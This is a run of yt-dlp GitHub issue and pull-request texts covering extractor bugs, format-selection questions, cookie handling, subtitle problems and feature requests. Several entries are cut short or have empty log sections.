- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Please make sure the question is worded well enough to be understood

Since curl supports HTTP/3, shouldn't curl-impersonate and thereby yt-dlp support HTTP/3 as well? As of now, curl uses HTTP/3 if `--http3` flag is specified in commandline; however, no such way to pass an option to curl-impersonate exists in yt-dlp.

So, my question is: shouldn't we opt for HTTP/3 by default and fallback to HTTP/2 when not supported, and provide an option to control this behaviour as well? I mean, let's face it, libraries like requests or urllib are just hopeless, for they haven't even moved past HTTP/1.1 yet. Web is moving fast, and our hope relies in libcurl, I guess.

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

India

### Provide a description that is worded well enough to be understood

When attempting to use `yt-dlp[stable]` with an MX Player URL, the tool fails with the following error:
```
No suitable extractor (MxPlayer) found for URL https://mxplayer.in
```
This indicates that yt-dlp is unable to identify or use an extractor capable of handling content from mxplayer.in. As a result, media from this site cannot be processed or downloaded.

### Expected Behavior

yt-dlp should:
- Successfully detect and use an appropriate extractor for MX Player URLs
- Download the full show (multiple episodes at once) prompting for format code for each playlist items in the URL.

### Actual Behavior

`yt-dlp` exits immediately with a “No suitable extractor found” error and does not attempt further processing.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Please make sure the question is worded well enough to be understood

Hello,

I use AppArmor with profiles from AppArmor.d Project. Previously, `yt-dlp` seemed to work fine confined by the existing profile. Currently, too, it works fine, but I see an audit message generated that indicates `yt-dlp` or something else that it invokes within its confinement profile is trying to execute `gcc` and being denied.

This occurs even if I don't supply any video URLs for `yt-dlp` to download. This is the denial message I see in the audit log:

`type=AVC msg=audit(1766226536.581:2755): apparmor=""DENIED"" operation=""exec"" class=""file"" profile=""yt-dlp"" name=""/usr/bin/gcc"" pid=208374 comm=""yt-dlp"" requested_mask=""x"" denied_mask=""x"" fsuid=1000
 ouid=0FSUID=""user"" OUID=""root""`

What is the reason for this attempt? Is this a recent change?

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

YouTube has rolled out ""voice boost"" (not to be confused with ""Stable Volume""). As far as I can tell, they're only accessible through the `web_safari` and `web` clients as SABR formats - see the duplicate audio tracks for the same itag in the format table below.

It'd be nice to have a format note and/or a format ID suffix that indicates these formats are processed by YouTube to be ""voice boosted"" (similar to how DRC formats are treated)

### Region

Global

### Provide a description that is worded well enough to be understood

I noticed that some videos hosted on vimeo has no audio for the `source` format.

I'm not very familiar with what this source format is, but the video itself plays on the original webpage (as an embedded video) fine. Or I can manually select and download with an audio track too.

But the default selection, which is only `live-archive-source` format, has no audio.

"[ie/twitcasting] Fix user paging and improve login required error The regex for next page links in `TwitCastingUserIE` is outdated and never matches. Update to match the current site format. Tested with user report URL in fixed issue below and also the existing (now passing) test.

`TwitCastingIE` is also raising a raw `ExtractorError` when trying to retrieve member-only videos without credentials. Detect these pages and replace with correct 'login required' error. Added a test for this case.

### Please make sure the question is worded well enough to be understood

I'm using Node's exec command to call yt-dlp for downloading YouTube videos, but the highest resolution I can get is 1080p. It can't find resources for 2K or above (the original video has a 2K version). What should I do to fix this?
code like this:

```
const YTDlpWrap = require('yt-dlp-wrap-plus').default;

const ytDlpWrap = new YTDlpWrap('./yt-dlp_x86.exe');

let ytDlpEventEmitter = ytDlpWrap
    .exec([
        'https://www.youtube.com/watch?v=*****',
        '--cookies',
        './cookies.txt',
        '--concurrent-fragments', '1',
        '-f',
        'bestvideo[height<=2160]+bestaudio/best[height<=2160]',
        '-o',
        'output.mp4',
    ])
    .on('progress', (progress) =>
        console.log(JSON.stringify(progress))
    )
    .on('ytDlpEvent', (eventType, eventData) =>
        console.log('event====' + eventType + eventData)
    )
    .on('error', (error) => console.error(error))
    .on('close', () => console.log('all done'));

console.log('pid:' + ytDlpEventEmitter.ytDlpProcess.pid);
```

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Please make sure the question is worded well enough to be understood

I am trying to scrape some VR180 videos from Youtube, but I noticed some inconsistent behavior when I'm downloading them using yt-dlp. I'm not sure if it's just because that these videos are not supported very well, or if I'm using the wrong commands for downloading them.

I am using the latest build from the experimental branch that supports SABR, and I have a pot server set up and running. I am using Python to download the videos, but I think the equivalent command is
```
yt-dlp --extractor-args ""youtube:player_client=web"" \
    -f ""bestvideo+bestaudio/best"" \
    --cookies www.youtube.com_cookies.txt \
    https://www.youtube.com/watch?v=[video id]
```

I noticed that on some videos, such as ""-ZnvwbPorDA"" (video id), this command is able to download the correct stereo video showing two side-by-side views:
<img width=""800"" height=""700"" alt=""Image"" src=""https://github.com/user-attachments/assets/6bd0a947-0e80-4025-994f-6fecf2379af2"" />

whereas on other videos, such as ""-2Bq3hAqfG0"", it seems to download a single monocular view:
<img width=""800"" height=""700"" alt=""Image"" src=""https://github.com/user-attachments/assets/093aac3e-c439-47d4-9624-55c375e5905a"" />

I tried to run the command with `--list-formats` and this is what the second video gave me:

Interestingly, it seems like the last row has a resolution different from all of the other rows, and I'm not sure if this might be related to the issue.

I also found out that I was able to download the same video as a correct stereo video a while back, but I totally forgot how I did it... so I would assume that it's possible to download it, but I'm not sure what I changed that broke the script (this video shows a resolution of 3840x2160, which does not seem to be one of the options listed above)
<img width=""800"" height=""700"" alt=""Image"" src=""https://github.com/user-attachments/assets/cc02db0a-2878-4089-925f-569a04278d1e"" />

I copied the verbose output for downloading the second video using my current command below. I'm relatively new to `yt-dlp`, so I apologize if there's something obvious I'm missing. I came across a couple other issues that mention downloading VR180, but I wasn't able to figure out how they relate to this issue. Since I was able to download that same video previous (about two weeks ago), I feel like there should be a way to get it to work. Any suggestions are appreciated!


### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Example URLs

https://www.zdfheute.de/video/heute-nachrichten/heute-19-uhr-vom-18-dezember-2025-100.html

### Provide a description that is worded well enough to be understood

I would like yt-dlp to properly recognize this as a ZDF url.
I know it can be done, it's way too simple:
Just remove the ""heute"" from the domain part and the ZDF servers take care of the rest with redirecting

https://www.zdfheute.de/video/heute-nachrichten/heute-19-uhr-vom-18-dezember-2025-100.html
becomes https://www.zdf.de/video/heute-nachrichten/heute-19-uhr-vom-18-dezember-2025-100.html
becomes https://www.zdf.de/video/magazine/heute-19-uhr-102/heute-19-uhr-vom-18-dezember-2025-100

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"BeaconTv: detect and parse JWPlayer chapter VTT tracks **Problem**
-------
Beacon has recently started adding official chapters to new Campaign 4 episodes and some one-shots. These videos include JWPlayer chapter tracks inside nested or JSON-encoded fields (e.g., videoData strings in the page's __NEXT_DATA__). The beacon.py extractor previously missed these, so `info['chapters']` was not populated

**Solution**
--------
- Recursively scan jwplayer_data, info['subtitles'], and content_data (including JSON-encoded videoData) for .vtt tracks
- Download and parse the first matching VTT (non-fatal)
- Populate `info['chapters']` with the parsed chapter list

**Notes**
-----
- Requires logged-in cookies from Beacon.tv membership
- Embed chapters using yt-dlp's postprocessors as usual (`--embed-metadata` or `--embed-chapters`)
- If no VTT is found or parsing fails, extraction proceeds normally

**How to test**
-----------
Run (Windows): `yt-dlp --cookies ""~/cookies.txt"" -J ""https://beacon.tv/content/c4-e009-to-the-hounds"" > out.json 2> ytlog.txt`

Expect a non-empty chapters array for the sample URL in out.json:
```

### Provide a description that is worded well enough to be understood

Hello, I would like to request a tool for detecting symbolic or non-symbolic links in yt-dlp.

An example of this would be when I am using a specific browser version—such as Google Chrome Stable, Beta, or Canary—and it automatically detects the link’s API when it is copied.

I believe this tool exists, but I am not entirely sure whether it is available in yt-dlp.

This tool could be applied to all possible yt-dlp download methods.

I believe it could be a small yet advanced implementation, creating a tool that allows downloading by simply pasting the link in Termux on Android, the Windows CMD, the Linux terminal, and also on macOS.

That being said, instead of being implemented for just one site, it could be implemented for all sites supported by yt-dlp.

I am not entirely certain, but this tool could be added to the core or to the main root that controls the download method for supported sites and links.

Overall, that is essentially it: symbolic or non-symbolic links.

It would be up to the developers to decide whether symbolic or non-symbolic detection should automatically select the best available quality or not.

For audio and video from links compatible with yt-dlp, together with the available FFmpeg version.

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

after it yt-dlp deleted file which was recorded and started to write video into new file.
I.e. on every disconnect yt-dlp deletes file.
I use newest nightly 2025.12.15.233113 version.

### Provide a description that is worded well enough to be understood

The extractor appears to be broken.
Here's the link I tried using during my test:
https://www.zdf.de/video/magazine/logo-154/logo-vom-mittwoch-17-dezember-2025-102

I would think the playlist is not supposed to be empty.
But that's where we're at.

The video works in the browser and plays just fine and the official download ability (which winds up linking to a file on the https://downloadzdf-a.akamaihd.net service) for this video is also ON.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead

### Region

Britain

### Provide a description that is worded well enough to be understood

I've been having this issue for some weeks now. Been too lazy to report it, honestly I assumed it would have been fixed already, but from what I can see it doesn't seem to have been reported. So whoops!

Simulating a full profile download will yield differing results.

`yt-dlp -vU -s https://www.tiktok.com/@bellapoarch`

Expected results: 781 items
`[download] Downloading item 1 of 781`
Potential results: 761 items
`[download] Downloading item 1 of 761`

If using `tiktokuser:channel_id` instead, outcome (_and verbose log_) is the same.
For some accounts I scrape, the difference between expected and potential can vary wildly, sometimes less than 50% of items returned. 
Verbose output from expected and potential results attached below.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"ydl.extract_info cannot get meta information in ""for members-only"" video ### Checklist

- [x] I'm reporting a bug unrelated to a specific site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

timestamp cannot be received, the problem is being reproduced
```
# python3.11 -m pip list
...
yt-dlp              2025.12.15.233113.dev0
yt-dlp-ejs          0.3.2
```

When trying to get info without downloading
https://www.youtube.com/watch?v=9iVcXphPVaM
```
with yt_dlp.YoutubeDL(ydl_opts) as ydl:
    info = ydl.extract_info(URL, download=False)
    timestamp = info.get('timestamp')
    print(f'timestamp=[{timestamp}]')
```

I get the same error:
ERROR: [youtube] 9iVcXphPVaM: This video is available to this channel's members on level: Assistant (or any higher level). Join this channel to get access to members-only content and other exclusive perks.

Although information about the video (title, date) is available even without registration

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

```shell
#!/usr/bin/env python3.11

import argparse
import yt_dlp
import time

# youtube-getdate.py --url=""https://www.youtube.com/watch?v=9iVcXphPVaM""

parser = argparse.ArgumentParser()
parser.add_argument('--url', type=str, default='')
args = parser.parse_args()

URL = args.url

ydl_opts = {

### Provide a description that is worded well enough to be understood

I am attempting to download a city council meeting. This has worked in the past, but I'm not sure that this is a *Supported* url.

Provider is granicus.

Stackoverflow (and research) indicates that if you can find the m3u8 file, and download that, then the download seems to work.

For example, this download works:
https://archive-stream.granicus.com/OnDemand/_definst_/mp4:archive/harrisonburg-va/harrisonburg-va_118f248a-e0c7-42ff-9c8a-fb027a349ab8.mp4/playlist.m3u8

### Region

United States

### Provide a description that is worded well enough to be understood

When attempting to download from a playlist with yt-dlp from nebula.tv there is an error as shown below. I believe the issue has to do with the url extractor. It extracts ""https://nebula.tv/embed/videos/jetlag-season-16-trailer"" which does play in the browser, but so does ""https://nebula.tv/videos/jetlag-season-16-trailer"". The version of the url without ""embed"" will download using yt-dlp. 

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

I suspect that a CDN URL is cut at the start of the download, but by the time `yt-dlp` has collected 100,000's of comments, the URL has timed out and `404`s.

A snippet of output; As you can imagine this takes a fair bit of time to reproduce and makes a fairly large log.
Let me know if we need a verbose end-to-end log & I can start working on it:

### Please make sure the question is worded well enough to be understood

I was hoping I could use the compare button found at the top of the latest master release's page to see which commits have been added since the release I currently have installed, but no matter which release I compare the latest master against it always seems to report that the releases are identical.

For example:

> There isn’t anything to compare.
> 
> 2024.09.27.205813 and 2025.12.07.233723 are identical. 

No verbose output supplied since it's not relevant to the question.

Belgium

### Provide a description that is worded well enough to be understood

To be clear: I can download almost any music video from ok.ru, but only once in a while download does not work. I can go on downloading others, but when I return to the offending one, the error remains the same. From which I conclude the problem is related to the specific page. I confirm there is no problem viewing the video in any browser (Chrome, Edge, etc). Only the actual download fails. I use the standalone executable, and have run it with the required -vU parameter. Output below. The url is https://ok.ru/video/3273373780645 (as shown in the verbose output). PS. I was not even behind a VPN. But of course, you need an account on ok.ru to test this.

I am by no means in any urgent need to download said video - I only report it as it may help improve yt-dlp. I am not a coder myself. I had an issue with another video a while ago (but did not report it) - it was exactly the identical problem.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"[on.orf.at]  --no-playlist parameter is ignored ### Checklist

- [x] I'm reporting that yt-dlp is broken on a **supported** site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've checked that all provided URLs are playable in a browser with the same IP and same login details
- [x] I've checked that all URLs and arguments with special characters are [properly quoted or escaped](https://github.com/yt-dlp/yt-dlp/wiki/FAQ#video-url-contains-an-ampersand--and-im-getting-some-strange-output-1-2839-or-v-is-not-recognized-as-an-internal-or-external-command)
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Region

anywhere

### Provide a description that is worded well enough to be understood

So, I want to download just the ""main video"" on this page here: https://on.orf.at/video/14303684/konkret-vom-15122025 
But I'm always getting the playlist format. --no-playlist parameter Dows not help. 

 Is this a bug, expected behaviour or I'm doing something wrong? Maybe this should be qualified as ""question"" and not a ""broken site"" issue type.. Apologies about that, if it's the case 

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

"--cookies modifies the cookies.txt file when it should not. ### Checklist

- [x] I'm reporting a bug unrelated to a specific site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

Passing cookies modifies the passed file.

## Steps

- Open your cookies.txt file to check that it doesn’t content any reference to dailymotion. Close it.
- Run this command
```pwsh
yt-dlp -f bestvideo+bestaudio/best --merge-output-format mp4 -o ""D:\OneDrive\Download\yt-dlp/%(title).70s.%(ext)s"" https://www.dailymotion.com/video/xibptm --cookies ""D:\OneDrive\Backup\Internet\youtube-dl\cookies.txt"" --js-runtimes bun
```
- Reopen the passed cookies.txt.

## Problem

Now it contains references to dailymotion

## Expectation

It should not be touched by the command.


### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

"[Critical Bug] --cookies-from-browser completely breaks downloading with specific rules ### Checklist

### Provide a description that is worded well enough to be understood

I regularly use yt-dlp for downloading audio in personal projects, and I typically need to use `--cookies-from-browser` in order to not be blocked by YouTube. This used to work just fine a while back. However as of late, now it's been returning an error whenever I ask it for audio only or printing titles. It will give me `Requested format is not available. Use --list-formats for a list of available formats`. However, if I take away `--cookies-from-browser`, then it works just fine? What??

Below I pasted two outputs. One of me downloading audio with `--cookies-from-browser`, and one without. You'll see the first one fails telling me my requested format is unavailable by somehow having `--cookies-from-browser` set.

This also happens when attempting to `print title` from videos with `--cookies-from-browser` added. My current work around for printing titles is adding `-f sb0` at the end, however I shouldn't need to do that since this wasn't a problem before, and it's still a problem with audio downloading with no solution currently.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead

### Please make sure the question is worded well enough to be understood

How can i download short video thumbnails from youtube channel.

Recently, when I request a list of short films from a YouTube channel using the Python library, the thumbnails list is empty. Is there a way to get the thumbnails list without requesting each short film individually using the library?

`
result = ydl.extract_info('https://www.youtube.com/shorts/sTr6LNhFVe8', download=False)
`
```json

### Region

_No response_

### Provide a description that is worded well enough to be understood

If a custom filename (`-o`) does not end with `.%(ext)s` (or happens to include the same extension that yt-dlp would also choose on its own), then an FFMPEG postprocessor, e.g. for SponsorBlock cutting, will fail with ""`Unable to choose an output format for 'file:a.temp'; use a standard extension for the filename or specify the format manually.`"" or a similar error. This seems to only affect audio-only formats, not video formats. To fix, yt-dlp would probably have to pass fitting arguments to explicitly tell FFMPEG what the file format is supposed to be for each format. Or, if you want to be lazy, just warn when an output template doesn't end with ""`.%(ext)s`"". :D

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

I am extremely tech illiterate,  so I typically stay away from github (especially since I struggle to trust a lot of the stuff on here'   I run it and it spams a bunch of command prompts all saying 'do not double-click,  call it from a command line'   I try to search up what a command line is and how to do what it's asking and I'm getting a bunch of tech wizardry stuff

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

United States of America

### Example URLs

https://youtu.be/TMO4NH8HAHQ

### Provide a description that is worded well enough to be understood

Recently, Youtube has been using AI to upscale older, lower resolution videos. Despite our ability to choose not to watch the upscaled version when watching within Youtube, downloading the video using yt-dlp will automatically choose the highest resolution, upscaled or not. If I want the non-upscaled, manual modification of each command must be done after checking the video.

I'm suggesting a new config tag to choose highest resolution that is *not* AI upscaled, as for some videos, the lower resolution is partially what makes the video special.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead

"[kick] VOD thumbnails not extracted ### Checklist

- [x] I've searched the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar requests **including closed ones**. DO NOT post duplicates

### Provide a description that is worded well enough to be understood

  ## Description

  yt-dlp extracts metadata (title, duration, uploader) for Kick VODs successfully, but the `thumbnail` field is always `null`. YouTube and Twitch VODs correctly return thumbnails.

  ## Verbose log

  Unable to provide full verbose output - local machine gets 403 without curl_cffi impersonation. On production server, extraction **succeeds** but thumbnail is null:

  ```json
  {
      ""platform"": ""kick"",
      ""title"": ""[!Stake] 50X FREE SPINS EVERY WINNER | !Website $50k LB $260k Rank Rewards | SchneckyIRL.com: Watch to Earn | Day 2/100 Cashouts"",
      ""duration_seconds"": 4194.0,
      ""thumbnail_url"": null,
      ""uploader"": ""schneckyirl""
  }
  ```

  ## Expected behavior

  The thumbnail field should contain a URL to the VOD's thumbnail image.

  ## Actual behavior

  thumbnail is always null for Kick VODs, even when other metadata extracts correctly.

  ## Analysis

  Looking at the extractor code in kick.py, the thumbnail is extracted via:

  `'thumbnail': ('livestream', 'thumbnail', {url_or_none}),`

  This expects response['livestream']['thumbnail'] from Kick's API. It appears either:
  1. Kick's VOD API doesn't return the livestream object
  2. Or livestream.thumbnail is null/missing in the response

  ## Test URL

  https://kick.com/schneckyirl/videos/948153f8-35aa-4c3a-98b7-20c33269c9a3

  ## Related Issues

  - Searched existing issues - found 403/access issues (#14444, #13442, #6748) but no specific reports about VOD thumbnails being null  
  - Commit 1e28f6b shows thumbnail test pattern `r're:^https?://.*\.jpg'` suggesting it should work

  ## Environment

  - yt-dlp version: stable@2025.12.08
  - Python version: 3.12
  - OS: Linux
  - curl_cffi: not installed (extraction still works on server)

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"about format selection ### Checklist

- [x] I'm asking a question and **not** reporting a bug or requesting a feature
- [x] I've looked through the [README](https://github.com/yt-dlp/yt-dlp#readme)
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar questions **including closed ones**.

### Please make sure the question is worded well enough to be understood

I want to download a yt video by format selection like this:
```
$ yt-dlp -f '(96/137/136) / (bv[ext~=mp4][height<=1080]) + (140 / (ba[language^=en][ext~=m4a] / ba[ext~=m4a]))' FAyKDaXEAgc
```

Console gives me 'ERROR: unable to download video data: HTTP Error 403: Forbidden' by reading format 137 instead.
This command should bypass format 96, 137, 136 and select format filter: 
```
'(bv[ext~=mp4][height<=1080]) + (140 / (ba[language^=en][ext~=m4a] / ba[ext~=m4a]))'.
```

or even simpler command:
```
$ yt-dlp -f 'bv[vcodec~=avc][height<=1080] + ba[acodec~=mp4a]' FAyKDaXEAgc
```

which gives me output text:
```
[info] FAyKDaXEAgc: Downloading 1 format(s): 137+140-12
ERROR: unable to download video data: HTTP Error 403: Forbidden
```

Update:
Now on any video console throws 403 error.

Please tell me what I'm doing wrong here?

"[Very simple feature request] Add alias for --playlist-items ### Checklist

- [x] I've looked through the [README](https://github.com/yt-dlp/yt-dlp#readme)

### Provide a description that is worded well enough to be understood

The problem: For some reason, there are many times where I type in `--playlist-index` instead of `--playlist-items`. I think `--playlist-index` makes more sense too
The solution: Add an alias for `--playlist-items`, `--playlist-index`. Like how `--abort-on-error` has alias `--no-ignore-errors`.

### Provide verbose output that clearly demonstrates the problem

"--downloader ""m3u8:ffmpeg"" attempts to download WebVTT subtitles into incompatible container (mp4) ### Checklist

- [x] I'm reporting a bug unrelated to a specific site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

When using `--downloader ""m3u8:ffmpeg""` (or `--hls-prefer-ffmpeg`) along with a flag to download subtitles (such as `--embed-subs` or `--write-subs`), yt-dlp will attempt to download WebVTT subtitles into an mp4 container, which is not supported.

The `ffmpeg` error output is not particularly helpful in itself (""Output file does not contain any stream""), but if you run the same ffmpeg command yt-dlp uses except with an explicit map, the problem becomes clear:

```console
$ ffmpeg -i https://v.redd.it/e3gzfhuzrk6g1/wh_ben_en/index.m3u8 -c copy -f mp4 -map 0:s:0 'file:How to deal with a crooked beam [e3gzfhuzrk6g1].en.vtt.part'
[...]
[mp4 @ 0x55a3c27b1340] Could not find tag for codec webvtt in stream #0, codec not currently supported in container
[out#0/mp4 @ 0x55a3c27b1240] Could not write header (incorrect codec parameters ?): Invalid argument
```

WebVTT subtitles need to be downloaded into either a container that supports them, or into a plain `vtt` file.

Output is from a random reddit video, but it seems likely that this applies to any site serving WebVTT using HLS.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

Hi.
I've been handed links to videos publicly shared on dropbox. They are download protected and I'd like to make offline copies.

This is the result:
```

```
Is there something wrong? I found some regex thing from a similar issue that's over a year old but couldn't find a way to use it to transform the URL. Changing ```fi``` to ```fo``` gives 404.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

Netherlands

### Provide a description that is worded well enough to be understood

After fully downloading an ongoing stream (started downloading while it was going -> ended when it ended) with subtitles included in the command, the subtitles did not make it into the final video.

The only subtitles that got included is at the start of the video and it is a small segment from god knows where in the stream which consists of multiple lines some of which are repeating,

**I'm unable to include the verbose output since stream went subscriber only after finishing and the command no longer works.**

```bash
./yt-dlp --version
2025.12.08
```

Command:
```bash
./yt-dlp --live-from-start ""https://www.youtube.com/watch?v=SH3VUnXaw1I"" --write-sub --write-auto-sub --sub-lang ""en.*"" --cookies-from-browser ""firefox:<HIDDEN>"" -k
```



### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Please make sure the question is worded well enough to be understood

This is my config:

`ydl_opts = {
      'outtmpl': temp_file,
      'cookiefile': tmp_cookie_path,
      'format': 'bestvideo+bestaudio/best',
      'merge_output_format': 'mp4',
      'http_headers': {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
      },
  }`

